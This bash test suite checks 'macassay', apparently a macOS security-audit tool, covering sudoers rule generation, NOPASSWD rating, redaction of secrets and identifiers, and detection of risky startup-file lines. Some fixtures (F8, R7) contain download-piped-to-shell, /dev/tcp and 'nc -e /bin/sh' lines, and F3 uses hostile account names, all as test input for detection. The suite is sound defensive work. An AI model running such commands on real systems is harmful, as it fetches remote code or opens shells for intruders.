#!/bin/bash
# Fixture tests for the logic functions in macassay. Development only; not shipped.
# Usage: dev/test.sh   (no root, no network; exits non-zero when a case fails)

cd "$(dirname "$0")/.." || exit 1
# shellcheck source=/dev/null  # the suite lints macassay on its own
MACASSAY_LIB=1 . ./macassay
T=$(mktemp -d /tmp/macassay-test.XXXXXX) || exit 1
# A watchdog stops the suite after 60 seconds, so a hang fails instead of stalling.
( sleep 60; echo "FAIL suite timed out after 60 seconds" >&2; kill -TERM $$ ) & WD=$!
trap '{ kill "$WD"; wait "$WD"; } 2>/dev/null; rm -rf "$T"' EXIT

FAILS=0
check() { local name="$1"; shift; if "$@"; then echo "ok   $name"; else echo "FAIL $name"; FAILS=$((FAILS+1)); fi; }
has()   { grep -qF -- "$2" "$1"; }
hasnt() { ! grep -qF -- "$2" "$1"; }
not()   { ! "$@"; }
visudo_ok() { /usr/sbin/visudo -c -f "$1" >/dev/null 2>&1; }

ACCTS='account root 0 /var/root
account alice 501 /Users/alice
account bob 502 /Users/bob
account _www 70 /Library/WebServer
sudoersd macassay
sudoersd extra_rules'

# F1: a normal account list gives a valid file for the granted user.
printf '%s\n' "$ACCTS" | gen_rules bob arm64 > "$T/f1" 2> "$T/f1.err"
check "F1 gen_rules exit status" [ $? -eq 0 ]
check "F1 visudo accepts the rules" visudo_ok "$T/f1"
check "F1 rules for alice" has "$T/f1" "/usr/bin/ssh-keygen -l -f /Users/alice/.ssh/authorized_keys"
check "F1 rules for root" has "$T/f1" "/bin/ls -ln /var/root/Library/LaunchAgents"
check "F1 no rules for the granted user" hasnt "$T/f1" "/Users/bob"
check "F1 no rules for system accounts" hasnt "$T/f1" "/Library/WebServer"
check "F1 sudoers.d files" has "$T/f1" "/bin/cat /etc/sudoers.d/extra_rules"
check "F1 always_set_home follows the alias" [ "$(grep -n 'Cmnd_Alias' "$T/f1" | cut -d: -f1)" -lt "$(grep -n 'always_set_home' "$T/f1" | cut -d: -f1)" ]
check "F1 grant line" has "$T/f1" "bob ALL = (root) NOPASSWD: MACASSAY"

# F2: no wildcards, no ALL in a command, no shell or interpreter, bputil only on Apple silicon.
grep '^    /' "$T/f1" > "$T/f2.cmds"
check "F2 no * in any rule" hasnt "$T/f1" "*"
check "F2 no ALL in a command" hasnt "$T/f2.cmds" "ALL"
check "F2 no shell, interpreter, editor or sqlite3" [ -z "$(awk '{print $1}' "$T/f2.cmds" | grep -E '/(ba|z|k|c|tc|da)?sh$|python|perl|ruby|osascript|vim?$|nano|emacs|sqlite3|env$')" ]
check "F2 bputil on arm64" has "$T/f1" "/usr/bin/bputil -d"
printf '%s\n' "$ACCTS" | gen_rules bob x86_64 > "$T/f2.intel" 2>/dev/null
check "F2 no bputil on Intel" hasnt "$T/f2.intel" "bputil"

# F3: hostile account names, home folders and sudoers.d names are skipped with a warning.
HOSTILE="$ACCTS
account bad,name 503 /Users/badname
account ev*l 504 /Users/evil
account dots 505 /Users/../etc
account outside 506 /tmp/x
account -dash 507 /Users/dash
account colon:x 508 /Users/c
account eq=x 509 /Users/e
account paren( 510 /Users/p
account back\\slash 511 /Users/b
account spacey 512 /Users/with space
account root 0 /Users/rootfake
sudoersd bad.name
sudoersd st*r
sudoersd br[acket
sudoersd with space"
printf '%s\n' "$HOSTILE" | gen_rules bob arm64 > "$T/f3" 2> "$T/f3.err"
check "F3 gen_rules still succeeds" [ $? -eq 0 ]
check "F3 visudo accepts the rules" visudo_ok "$T/f3"
for bad in badname evil "/Users/../etc" /tmp/x /Users/dash /Users/c /Users/e /Users/p /Users/b "with space" rootfake bad.name "st*r" "br[acket"; do
  check "F3 skips $bad" hasnt "$T/f3" "$bad"
done
check "F3 warns for each skipped item" [ "$(grep -c Skipping "$T/f3.err")" -ge 15 ]

# F4: the granted user must exist and be a regular account.
for u in root _www nosuch "bad name"; do
  printf '%s\n' "$ACCTS" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses granted user '$u'" [ $? -ne 0 ]
done
# A name that reads as a sudoers alias, or ALL, would widen the grant line.
for u in ALL ADMIN_1; do
  printf '%s\naccount %s 503 /Users/%s\n' "$ACCTS" "$u" "$u" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses alias-like user '$u'" [ $? -ne 0 ]
done

# F5: sudo refusals are told apart from a command's own failure.
printf 'sudo: a password is required\n' > "$T/e1"
printf "Sorry, user bob is not allowed to execute '/bin/cat /x' as root on host.\n" > "$T/e2"
printf 'sudo: /usr/bin/bputil: command not found\n' > "$T/e3"
printf 'ls: /Users/alice/.zlogin: No such file or directory\n' > "$T/e4"
: > "$T/e5"
check "F5 password required is a refusal" classify_refusal 1 "$T/e1"
check "F5 not allowed is a refusal" classify_refusal 1 "$T/e2"
check "F5 missing command is a refusal" classify_refusal 1 "$T/e3"
check "F5 command failure is not a refusal" not classify_refusal 1 "$T/e4"
check "F5 success is not a refusal" not classify_refusal 0 "$T/e5"

# F6: NOPASSWD rules are found and rated.
cat > "$T/sudoers" <<'EOF'
# alice ALL = (ALL) NOPASSWD: ALL   (a comment)
Defaults env_reset
%admin ALL = (ALL) ALL
alice ALL = (ALL) NOPASSWD: ALL
bob ALL = (root) NOPASSWD: /bin/kill
carol ALL = NOPASSWD:ALL
dave ALL = (root) NOPASSWD: ALLOWED_CMDS
erin ALL = (root) \
    NOPASSWD: ALL
Cmnd_Alias X = /bin/a, \
    /bin/b
#501 ALL = (ALL) NOPASSWD: ALL
frank ALL = (root) NOPASSWD: SETENV: ALL
gina ALL = (root) NOPASSWD:/bin/ls,ALL
#includedir /private/etc/sudoers.d
EOF
classify_sudoers < "$T/sudoers" > "$T/f6"
check "F6 six NOPASSWD: ALL rules are HIGH" [ "$(cut -f2 "$T/f6" | grep -c '^HIGH')" -eq 6 ]
check "F6 a #UID rule is not a comment" has "$T/f6" "#501 ALL = (ALL) NOPASSWD: ALL"
check "F6 two other NOPASSWD rules are LOW" [ "$(cut -f2 "$T/f6" | grep -c '^LOW')" -eq 2 ]
check "F6 IDs for the two risks" [ "$(cut -f1 "$T/f6" | sort -u | paste -sd, -)" = "MA-ACCOUNTS-005,MA-ACCOUNTS-006" ]
check "F6 continued line joined" has "$T/f6" "erin ALL = (root) NOPASSWD: ALL"
check "F6 comments, includes and Defaults ignored" [ "$(wc -l < "$T/f6" | tr -d ' ')" -eq 8 ]

# F7: allow-lists keep settings and drop identifiers.
# The bputil fixture follows real macOS 27.2 output, with identifiers replaced.
cat > "$T/bputil" <<'EOF'
OS Type                                       : macOS
Local Policy Nonce Hash                 (lpnh): 1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
Unique Chip ID                          (ECID): 0x123456789ABCDE
Security Mode                           (CSEC): 1
Volume Group UUID                       (vuid): 11111111-2222-3333-4444-555555555555
Security Mode:               Reduced    (smb0): 1
3rd Party Kexts Status:      Enabled    (smb2): 1
DEP-allowed MDM Control:     Enabled    (smb4): 1
SIP Status:                  Enabled    (sip0): absent
EOF
filter_bputil < "$T/bputil" > "$T/f7b"
check "F7 bputil keeps the security mode" has "$T/f7b" "Security Mode:               Reduced"
check "F7 bputil keeps SIP" has "$T/f7b" "SIP Status"
check "F7 bputil keeps kexts" has "$T/f7b" "Kexts Status"
check "F7 bputil drops UUIDs, hashes and the chip ID" [ -z "$(grep -E '1111|ABCDEF|ECID' "$T/f7b")" ]
check "F7 bputil mode from the smb0 line" [ "$(bputil_mode < "$T/bputil")" = Reduced ]
check "F7 bputil mode Full" [ "$(printf 'Security Mode                           (CSEC): 1\nSecurity Mode:               Full       (smb0): absent\n' | bputil_mode)" = Full ]
cat > "$T/profiles" <<'EOF'
There are 2 configuration profiles installed
_computerlevel[1] attribute: name: Wi-Fi
_computerlevel[1] attribute: profileIdentifier: com.example.wifi
_computerlevel[1] attribute: profileUUID: 11111111-2222-3333-4444-555555555555
_computerlevel[2] attribute: name: 22222222-3333-4444-5555-666666666666
_computerlevel[1] attribute: organization: Example
_computerlevel[1] attribute: installationDate: 2026-01-01
EOF
filter_profiles < "$T/profiles" > "$T/f7p"
check "F7 profiles keeps names, identifiers, organization" [ "$(wc -l < "$T/f7p" | tr -d ' ')" -eq 4 ]
check "F7 profiles drops UUIDs" [ -z "$(grep -E '1111|2222' "$T/f7p")" ]

# F8: startup-file matches name the pattern and never copy the line.
cat > "$T/rc" <<'EOF'
curl -s https://x.example | sh   # SECRET_TOKEN_1
export X=$(echo abc | base64 -D) SECRET_TOKEN_2
bash -c "$(curl -fsSL https://y.example)" SECRET_TOKEN_3
wget -qO- z.example | bash
cat a | bash -s
eval "$(curl q.example)"
exec 3<>/dev/tcp/192.0.2.1/80
nc -e /bin/sh h.example
osascript -e 'beep'
echo harmless
EOF
rc_hits "$T/rc" "$T/missing" > "$T/f8"
check "F8 no line text in the output" [ -z "$(grep -E 'SECRET|example|harmless' "$T/f8")" ]
for want in "1: download piped to a shell" "2: base64 decode" "3: shell running a download" "4: download piped to a shell" \
            "5: shell reading a script from a pipe" "6: eval of a download" "7: /dev/tcp connection" "8: nc with -e" "9: osascript -e"; do
  check "F8 finds $want" has "$T/f8" "$T/rc:$want"
done
check "F8 no match on a harmless line" hasnt "$T/f8" "$T/rc:10:"

# F9: SSH methods that accept a password.
check "F9 password" ssh_methods_flag "(publickey,password)"
check "F9 keyboard-interactive" ssh_methods_flag "(publickey,keyboard-interactive)"
check "F9 publickey alone" not ssh_methods_flag "(publickey)"

# F10: report text from the audited Mac stays in one cell.
# shellcheck disable=SC2016  # the backticks are literal test input
out=$(printf 'evil\nHIGH\tArea|x`y`\rz' | clean_field)
check "F10 one line" [ "$(printf '%s\n' "$out" | wc -l | tr -d ' ')" -eq 1 ]
check "F10 no tab, pipe or backtick" [ -z "$(printf '%s' "$out" | tr -d -c '\t|`')" ]
check "F10 text kept" [ "$out" = "evil HIGH Area/xy z" ]

# F11: dashed UUIDs anywhere in the report are replaced.
out=$(printf '/Library/SystemExtensions/688AE699-C0FB-4B23-91E1-6ACB69076699/x and abcdefab-cdef-abcd-efab-cdef00000050\n' | redact_ids)
check "F11 UUIDs replaced" [ "$out" = "/Library/SystemExtensions/<UUID>/x and <UUID>" ]

# F12: crontab lines show the schedule and command name, never arguments or values.
printf '%s\n' '# comment' 'API_KEY=SECRET_A' '*/5 * * * * /usr/bin/curl -H "Authorization: SECRET_B" https://x' \
  '@reboot /Users/x/bin/start.sh SECRET_C' '0 3 * * * TOKEN=SECRET_D /bin/run' | crontab_summary > "$T/f12"
check "F12 no secrets" [ -z "$(grep SECRET "$T/f12" | grep -v 'API_KEY (value hidden)')" ]
check "F12 variable named without value" has "$T/f12" "environment variable API_KEY (value hidden)"
check "F12 schedule and command" has "$T/f12" "*/5 * * * *  curl (arguments hidden)"
check "F12 @reboot entry" has "$T/f12" "@reboot  start.sh (arguments hidden)"
check "F12 inline variables hidden" has "$T/f12" "0 3 * * *  (command with inline variables) (arguments hidden)"

# F13: a program owned by this user is HIGH.
touch "$T/prog"
check "F13 user-owned program is HIGH" [ "$(chain_writable "$T/prog" | cut -f1)" = HIGH ]

# F14: a failed install rollback is reported, not claimed as restored.
mkdir "$T/sd"
sudoers_ok() { ! grep -qs BAD "$RULES"; }
( RULES="$T/sd/macassay"; TMP="$T/r1"; mkdir "$TMP"; echo BAD > "$RULES"
  rollback_rules && [ ! -e "$RULES" ] ) 2>/dev/null
check "F14 no backup: bad file removed, rollback succeeds" [ $? -eq 0 ]
( RULES="$T/sd/macassay"; TMP="$T/r2"; mkdir "$TMP"; echo BAD > "$RULES"; echo good > "$TMP/old"
  rollback_rules ) 2>/dev/null
check "F14 backup not installable: rollback returns 2" [ $? -eq 2 ]
check "F14 backup not installable: bad file removed" [ ! -e "$T/sd/macassay" ]
check "F14 no .macassay.new left behind" [ ! -e "$T/sd/.macassay.new" ]
( RULES="$T/sd/macassay"; TMP="$T/r3"; mkdir "$TMP"; sudoers_ok() { false; }; echo BAD > "$RULES"
  rollback_rules ) 2>/dev/null
check "F14 sudo still broken: rollback returns 1" [ $? -eq 1 ]

# F15: every finding call names a literal ID, or "$id" from a function that prints literal IDs, and one of the 14 section labels.
LABELS="Health Backups Updates Platform Management Sharing Network Persistence Apps Accounts Credentials Developer Trust Events"
LABRE=$(echo "$LABELS" | tr 'a-z ' 'A-Z|')
grep -v '^[[:space:]]*#' macassay | grep -oE '(^|[^A-Za-z_])finding [A-Z"$][^ ]* [^ ]+ [^ ]+' | sed -E 's/^[^f]*//' > "$T/f15"
check "F15 finding calls found" [ "$(grep -c . "$T/f15")" -ge 57 ]
check "F15 every call has a literal ID or \$id" [ -z "$(awk '$2 !~ /^(MA-[A-Z]+-[0-9][0-9][0-9]|"\$id")$/' "$T/f15")" ]
check "F15 every call names a section label" [ -z "$(awk -v l=" $LABELS " 'index(l, " " $4 " ") == 0' "$T/f15")" ]
check "F15 no flag calls left" [ -z "$(grep -v '^[[:space:]]*#' macassay | grep -E '(^|[;&|{()]|then|do|else)[[:space:]]*flag ')" ]

# F16: every ID has a section label and three digits; call sites share an ID only where listed (one risk at two severities or two places).
grep -oE 'MA-[A-Za-z]+-[0-9]+' macassay | sort > "$T/f16"
check "F16 every ID has a label and three digits" [ -z "$(grep -vxE "MA-($LABRE)-[0-9]{3}" "$T/f16")" ]
grep -oE 'finding MA-[A-Z]+-[0-9]+' macassay | sort | uniq -d > "$T/f16d"
check "F16 shared IDs are only the listed ones" [ -z "$(grep -vxE 'finding (MA-HEALTH-003|MA-SHARING-007|MA-PLATFORM-009|MA-UPDATES-003)' "$T/f16d")" ]

# G1: long hex runs in certificate labels are masked; dashed UUIDs are still replaced.
h32=0123456789abcdef0123456789ABCDEF; h31=${h32:0:31}
check "G1 32 hex characters masked" [ "$(echo "CA $h32" | mask_hex)" = "CA <ID>" ]
check "G1 64 hex characters masked" [ "$(echo "CA $h32$h32 x" | mask_hex)" = "CA <ID> x" ]
check "G1 31 hex characters kept" [ "$(echo "CA $h31" | mask_hex)" = "CA $h31" ]
check "G1 redact_ids still replaces a UUID" [ "$(echo 11111111-2222-3333-4444-555555555555 | redact_ids)" = "<UUID>" ]

# G2, G17: trust settings count by the SecTrustSettings.h rule; names are masked and policy strings dropped.
cat > "$T/trust" <<'EOF'
Number of trusted certs = 5
Cert 0: Root A 0123456789abcdef0123456789abcdef
   Number of trust settings : 1
   Trust Setting 0:
      Policy OID            : SSL
      Policy String         : 192.0.2.10
      Result Type           : kSecTrustSettingsResultTrustRoot
Cert 1: No Result B
   Number of trust settings : 1
   Trust Setting 0:
      Policy OID            : SSL
Cert 2: Always C
   Number of trust settings : 0
Cert 3: Denied D
   Number of trust settings : 1
   Trust Setting 0:
      Result Type           : kSecTrustSettingsResultDeny
Cert 4: Unspecified E
   Number of trust settings : 1
   Trust Setting 0:
      Result Type           : kSecTrustSettingsResultUnspecified
EOF
trusted_certs < "$T/trust" | mask_hex > "$T/g17"
check "G17 TrustRoot, no result and zero settings count" [ "$(grep -c . "$T/g17")" -eq 3 ]
check "G17 Deny and Unspecified do not count" [ -z "$(grep -E 'Denied|Unspecified' "$T/g17")" ]
check "G2 names kept and masked" has "$T/g17" "Root A <ID>"
check "G2 policy strings dropped" hasnt "$T/g17" "192.0.2.10"

# G20: admin-group write is MEDIUM only under /Applications; group write counts when the group has other members.
( stat() { case "$3" in /Applications) echo "root drwxrwxr-x admin" ;; *) echo "root drwxr-xr-x wheel" ;; esac; }
  [ "$(chain_writable /Applications | cut -f1)" = MEDIUM ] )
check "G20 admin-writable folder under /Applications is MEDIUM" [ $? -eq 0 ]
( stat() { case "$3" in /Library) echo "root drwxrwxr-x admin" ;; *) echo "root drwxr-xr-x wheel" ;; esac; }
  [ "$(chain_writable /Library | cut -f1)" = HIGH ] )
check "G20 admin-writable folder under /Library is HIGH" [ $? -eq 0 ]
printf 'bob ALL = (root) NOPASSWD: %s\n' "$T/prog" | sudoers_findings /etc/sudoers > "$T/g20s"
check "G20 NOPASSWD for a user-writable program is HIGH" [ "$(cut -f1,2 "$T/g20s")" = $'MA-ACCOUNTS-008\tHIGH' ]
( group_has_others() { [ "$1" = 20 ]; }
  printf '%s\n' '-rw-rw-r--  1 501  20  10 Nov 1 10:00 /Users/a/.zshrc' \
                '-rw-r--r--  1 502  20  10 Nov 1 10:00 /Users/a/.bashrc' \
                '-rw-r--r--  1 0  0  10 Nov 1 10:00 /Users/a/.profile' \
                '-rw-rw-r--  1 501  99  10 Nov 1 10:00 /Users/a/.zshenv' \
                '-rw-r--rw-  1 0  0  10 Nov 1 10:00 /Users/a/.zlogin' | rc_file_risks 501 a ) > "$T/g20rc"
check "G20 rc file writable by staff" has "$T/g20rc" $'/Users/a/.zshrc\twritable by group 20'
check "G20 rc file owned by another account" has "$T/g20rc" $'/Users/a/.bashrc\towned by UID 502'
check "G20 root-owned rc file gives nothing" hasnt "$T/g20rc" ".profile"
check "G20 group without other members gives nothing" hasnt "$T/g20rc" ".zshenv"
check "G20 rc file writable by everyone" has "$T/g20rc" ".zlogin"

# R7: severity rules for the startup-pattern split, the secure boot mode and the temporary-folder program.
printf '%s\n' 'echo x | base64 -d' "osascript -e 'beep'" > "$T/g21a"
printf '%s\n' 'curl -s https://x.example | sh' 'echo x | base64 -d' > "$T/g21b"
echo harmless > "$T/g21c"
for k in a b c; do rc_hits "$T/g21$k" > "$T/g21$k.h"; rc_pattern_sevs "$T/g21$k.h" > "$T/g21$k.s"; done
check "R7 base64 and osascript only give MEDIUM" [ "$(paste -sd, - < "$T/g21a.s")" = MEDIUM ]
check "R7 download-and-run plus base64 give HIGH and MEDIUM" [ "$(paste -sd, - < "$T/g21b.s")" = HIGH,MEDIUM ]
check "R7 no hits give nothing" [ ! -s "$T/g21c.s" ]
check "R7 boot mode Full gives nothing" [ -z "$(boot_policy_sev Full)" ]
check "R7 boot mode empty gives nothing" [ -z "$(boot_policy_sev '')" ]
check "R7 boot mode Reduced is MEDIUM" [ "$(boot_policy_sev Reduced)" = MEDIUM ]
check "R7 boot mode Permissive is HIGH" [ "$(boot_policy_sev Permissive)" = HIGH ]
check "R7 App Translocation path is not a temporary program" not temp_program /private/var/folders/ab/T/AppTranslocation/X/d/X.app/Contents/MacOS/X
check "R7 plain /private/var/folders path is a temporary program" temp_program /private/var/folders/ab/T/x/prog
check "R7 /Users/Shared path is a temporary program" temp_program /Users/Shared/prog
check "R7 /Applications program is not a temporary program" not temp_program /Applications/X.app/Contents/MacOS/X

# G11: missing update settings print the macOS default; the SoftwareUpdate domain is read one key at a time.
BODY="$T/g11"; : > "$BODY"
default_line "Automatic checks (AutomaticCheckEnabled)" "" "1, on"
default_line "Automatic download (AutomaticDownload)" 0 "1, on"
check "G11 missing key prints the macOS default" has "$T/g11" "- Automatic checks (AutomaticCheckEnabled): not set (macOS default: 1, on)"
check "G11 set key prints its value" has "$T/g11" "- Automatic download (AutomaticDownload): 0"
check "G11 no whole-domain read of SoftwareUpdate" [ -z "$(grep -E 'defaults read [^ ]*SoftwareUpdate[^ ]* *(2>/dev/null)? *(\||$)' macassay)" ]
check "G11 AutoInstallProductKeys is never read" hasnt macassay "AutoInstallProductKeys"

# G21: recent installs list non-Apple installs since the cutoff, without nested package lists.
cat > "$T/ih" <<'EOF'
[
  0 => {
    "date" => 2026-10-01 05:33:25 +0000
    "displayName" => "macOS 27.1"
    "displayVersion" => "27.1"
    "processName" => "softwareupdated"
  }
  1 => {
    "date" => 2026-11-20 05:39:05 +0000
    "displayName" => "Example App"
    "displayVersion" => "2.0"
    "packageIdentifiers" => [
      0 => "com.example.app"
    ]
    "processName" => "installer"
  }
  2 => {
    "date" => 2026-09-01 01:00:00 +0000
    "displayName" => "Old App"
    "displayVersion" => "1.0"
    "processName" => "installer"
  }
]
EOF
recent_installs 2026-10-25 < "$T/ih" > "$T/g21"
check "G21 recent non-Apple install listed" has "$T/g21" "2026-11-20  Example App 2.0"
check "G21 Apple and old installs skipped" [ "$(grep -c . "$T/g21")" -eq 1 ]

# G9: screen lock severities from sysadminctl text.
check "G9 immediate gives nothing" [ -z "$(screen_lock_sev 'screenLock delay is immediate')" ]
check "G9 5 seconds gives nothing" [ -z "$(screen_lock_sev 'screenLock delay is 5 seconds')" ]
check "G9 900 seconds is LOW" [ "$(screen_lock_sev 'screenLock delay is 900 seconds' | cut -f1)" = LOW ]
check "G9 7200 seconds is MEDIUM" [ "$(screen_lock_sev 'screenLock delay is 7200 seconds' | cut -f1)" = MEDIUM ]
check "G9 off is MEDIUM" [ "$(screen_lock_sev 'screenLock is off' | cut -f1)" = MEDIUM ]
check "G15 one screen lock finding call" [ "$(grep -c 'finding MA-PLATFORM-010' macassay)" -eq 1 ]
# G10: boot arguments.
check "G10 no boot arguments" [ -z "$(boot_args_sev '')" ]
check "G10 -v is LOW" [ "$(boot_args_sev '-v')" = LOW ]
check "G10 amfi argument is HIGH" [ "$(boot_args_sev 'amfi_get_out_of_my_way=1')" = HIGH ]

echo ""
if [ "$FAILS" -eq 0 ]; then echo "All cases passed."; else echo "$FAILS case(s) failed."; exit 1; fi
